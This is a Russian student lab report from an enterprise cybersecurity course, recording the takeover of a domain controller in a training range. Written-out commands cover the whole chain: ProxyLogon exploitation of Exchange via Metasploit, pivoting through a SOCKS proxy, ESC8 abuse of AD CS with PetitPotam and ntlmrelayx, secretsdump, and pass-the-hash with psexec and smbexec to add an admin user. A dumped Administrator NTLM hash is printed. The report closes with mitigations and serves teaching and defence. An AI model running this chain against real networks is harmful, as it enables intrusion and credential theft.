
---
## Front matter
title: "Отчет по лабораторной работе №5-F. ЗАХВАТ КОНТРОЛЛЕРА ДОМЕНА 2"
subtitle: "Дисциплина: Кибербезопасность предприятия"
author:
  - "Боровиков Даниил"
  - "Хрусталев Влад" 
  - "Гисматуллин Артём"
  - "Чесноков Артёмий"
  - "Коннова Татьяна"
  - "Нефедова Наталья"
  - "Уткина Алина"
  - "Бансимба Клодели"
  
## Generic options
lang: ru-RU
toc-title: "Содержание"

## Pdf output format
toc: true # Table of contents
toc-depth: 2
lof: true # List of figures
lot: true # List of tables
fontsize: 12pt
linestretch: 1.5
papersize: a4
documentclass: scrreprt
## I18n polyglossia
polyglossia-lang:
  name: russian
  options:
	- spelling=modern
	- babelshorthands=true
polyglossia-otherlangs:
  name: english
## I18n babel
babel-lang: russian
babel-otherlangs: english
## Fonts
mainfont: IBM Plex Serif
romanfont: IBM Plex Serif
sansfont: IBM Plex Sans
monofont: IBM Plex Mono
mathfont: STIX Two Math
mainfontoptions: Ligatures=Common,Ligatures=TeX,Scale=0.94
romanfontoptions: Ligatures=Common,Ligatures=TeX,Scale=0.94
sansfontoptions: Ligatures=Common,Ligatures=TeX,Scale=MatchLowercase,Scale=0.94
monofontoptions: Scale=MatchLowercase,Scale=0.94,FakeStretch=0.9
mathfontoptions:
## Biblatex
biblatex: true
biblio-style: "gost-numeric"
biblatexoptions:
  - parentracker=true
  - backend=biber
  - hyperref=auto
  - language=auto
  - autolang=other*
  - citestyle=gost-numeric
## Pandoc-crossref LaTeX customization
figureTitle: "Рис."
tableTitle: "Таблица"
listingTitle: "Листинг"
lofTitle: "Список иллюстраций"
lotTitle: "Список таблиц"
lolTitle: "Листинги"
## Misc options
indent: true
header-includes:
  - \usepackage{indentfirst}
  - \usepackage{float} # keep figures where there are in the text
  - \floatplacement{figure}{H} # keep figures where there are in the text
---

# Введение 

**Цель работы:** Получить доступ к контроллеру домена, создать доменного пользователя `hacker`, добавить его в локальную группу `Administrators` и получить флаг в одном из полей пользователя.

**Исходные данные:**
- Атакующая машина (Kali): 195.239.174.11
- Целевая сеть: 195.239.174.0/24
- Запрещено атаковать: 195.239.174.12
- Внутренняя доменная сеть: 10.10.10.0/24

**Основные цели:**
- Почтовый сервер Exchange: 195.239.174.1
- Контроллер домена (AD): 10.10.10.20
- Центр сертификации (CS): 10.10.10.40
- Домен: `ampire.corp`

# Этап 1: Разведка и поиск вектора атаки

## 1.1 Сканирование сети

Выполнено сканирование целевой подсети с помощью `nmap`:

```bash
nmap -sV -sC 195.239.174.0/24
```

**Результаты:**
- `195.239.174.1`: порты 25 (SMTP) и 443 (HTTPS) открыты → предполагаемый почтовый сервер Exchange.
- `195.239.174.12`: порты 22 (SSH) и 8888 открыты (атака запрещена).
- `195.239.174.25`: порт 80 (HTTP) открыт → веб-портал.

## 1.2 Идентификация Exchange Server

Через веб-интерфейс `https://195.239.174.1` подтверждено наличие Microsoft Exchange Server.  
Определена версия через eDiscovery Export Tool: `15.1.1713.5` (Exchange Server 2016 CU12).

**Найденные уязвимости (CVSS >= 9):**
- CVE-2021-26855 (ProxyLogon)
- CVE-2021-34473 (ProxyShell)

## 1.3 Получение начального доступа

Использована уязвимость **ProxyLogon** через Metasploit:

```bash
use exploit/windows/http/exchange_proxylogon_rce
set lhost 195.239.174.11
set rhosts 195.239.174.1
set email manager1@ampire.corp
run
```

**Результат:** Получена `meterpreter`-сессия на почтовом сервере `MAIL (10.10.10.10)`.

# Этап 2: Внутренняя разведка и подготовка

## 2.1 Анализ сетевых интерфейсов

Выполнена команда `ifconfig` в сессии meterpreter. Обнаружена внутренняя сеть `10.10.10.0/24`.

## 2.2 Проброс портов и сканирование

Добавлен маршрут до внутренней сети:

```bash
run autoroute -s 10.10.10.0/24
```

Сканирование ARP и доменных компьютеров:

```bash
run post/windows/gather/arp_scanner RHOSTS=10.10.10.0/24
run post/windows/gather/enum_ad_computers
```

**Обнаружены хосты:**
- `ad.ampire.corp` (10.10.10.20) – контроллер домена
- `cs.ampire.corp` (10.10.10.40) – центр сертификации
- `fs.ampire.corp` – файловый сервер
- `mail.ampire.corp` – почтовый сервер

## 2.3 Создание доменного пользователя

В сессии на почтовом сервере создан пользователь для дальнейшего сканирования:

```bash
net user /add hack qwe123 /domain
```

## 2.4 Настройка SOCKS-прокси

Запущен SOCKS-прокси через Metasploit для туннелирования трафика:

```bash
use auxiliary/server/socks_proxy
set srvhost 127.0.0.1
set srvport 1081
run
```

# Этап 3: Поиск вектора атаки через AD CS

## 3.1 Сканирование центра сертификации

Использован `certipy-ad` для анализа AD Certificate Services:

```bash
proxychains certipy-ad find -target ad.ampire.corp -u hack -p 'qwe123'
```

**Результат:** Обнаружена уязвимость **ESC8**:
- Web Enrollment включён
- Request Disposition = Issue (автовыпуск сертификатов)

## 3.2 Проверка возможности атаки

Запущен `responder` для перехвата NTLM-хешей:

```bash
responder -I eth0 -v
```

Проверена работа уязвимости **PetitPotam**:

```bash
proxychains python3 PetitPotam.py -d ad.ampire.corp 195.239.174.11 10.10.10.20
```

**Результат:** Контроллер домена успешно принуждён к аутентификации на атакующей машине.

# Этап 4: Атака на центр сертификации (ESC8)

## 4.1 Получение сертификата через NTLM Relay

Запущен `ntlmrelayx` для перехвата аутентификации и получения сертификата:

```bash
proxychains impacket-ntlmrelayx --debug --smb2support --target http://10.10.10.40/certsrv --adcs --template KerberosAuthentication
```

Повторно запущен PetitPotam для принуждения аутентификации контроллера домена.

**Результат:** Получен PKCS#12 сертификат для учётной записи `AD$` (машинной учётной записи контроллера домена).

## 4.2 Получение TGT-билета

Использован `gettgtpkinit` для получения Kerberos TGT:

```bash
proxychains python3 gettgtpkinit.py -cert-pfx /root/AD\$.pfx -dc-ip 10.10.10.20 ampire.corp/ad\$ ticket.ccache
```

TGT-билет сохранён в файл `ticket.ccache`.

## 4.3 Выгрузка хешей пользователей

Экспорт переменной окружения для использования Kerberos-билета:

```bash
export KRB5CCNAME=ticket.ccache
```

Дамп хешей через `secretsdump`:

```bash
proxychains impacket-secretsdump -k ad.ampire.corp -no-pass -just-dc
```

**Получен NTLM-хеш администратора домена:**
```
Administrator:aad3b435b51404eeaad3b435b51404ee:1b21da9cb62cfcaf16c5dd263255bf6f
```

# Этап 5: Захват контроллера домена

## 5.1 Получение сессии через psexec

Использован модуль Metasploit `windows/smb/psexec` с полученным хешем:

```bash
use exploit/windows/smb/psexec
set smbuser Administrator
set smbpass aad3b435b51404eeaad3b435b51404ee:1b21da9cb62cfcaf16c5dd263255bf6f
set rhosts 10.10.10.20
set lhost 195.239.174.11
run
```

**Результат:** Получена `meterpreter`-сессия на контроллере домена.

## 5.2 Создание пользователя hacker

В сессии на контроллере домена:

```bash
net user /add hacker qwe123
net localgroup Administrators hacker /add
net user hacker
```

**Результат:** Пользователь `hacker` создан и добавлен в группу `Administrators`. В поле `Comment` появился флаг: **35269**.

## 5.3 Альтернативный метод: smbexec

Также использован `smbexec.py` для получения shell:

```bash
proxychains python3 smbexec.py -hashes 
aad3b435b51404eeaad3b435b51404ee:1b21da9cb62cfcaf16c5dd263255bf6f -no-pass ampire.corp/Administrator@10.10.10.20
```

Результаты (рис. [-@fig:001]):

![Итоги](image/01.png){ #fig:001 width=70%, height=70% }

# Выводы

В ходе лабораторной работы успешно выполнена комплексная атака на инфраструктуру организации:

1. **Начальный доступ** получен через уязвимость **ProxyLogon** в Microsoft Exchange Server.
2. **Внутренняя разведка** позволила обнаружить доменную сеть, контроллер домена и центр сертификации.
3. **Обнаружена критическая уязвимость ESC8** в Active Directory Certificate Services, позволяющая выполнить NTLM Relay-атаку.
4. **Использована связка утилит** (PetitPotam + ntlmrelayx + gettgtpkinit + secretsdump) для получения хешей администратора домена.
5. **Захват контроллера домена** выполнен через psexec с использованием полученного NTLM-хеша.
6. **Достигнута цель**: создан пользователь `hacker`, добавлен в группу `Administrators`, получен флаг **35269**.

Работа демонстрирует важность:
- Своевременного обновления Exchange Server.
- Настройки AD CS с отключением Web Enrollment или установкой Request Disposition в "Pending".
- Мониторинга аномальной активности, связанной с принудительной аутентификацией (PetitPotam).
- Использования защищённых протоколов аутентификации (Kerberos вместо NTLM).
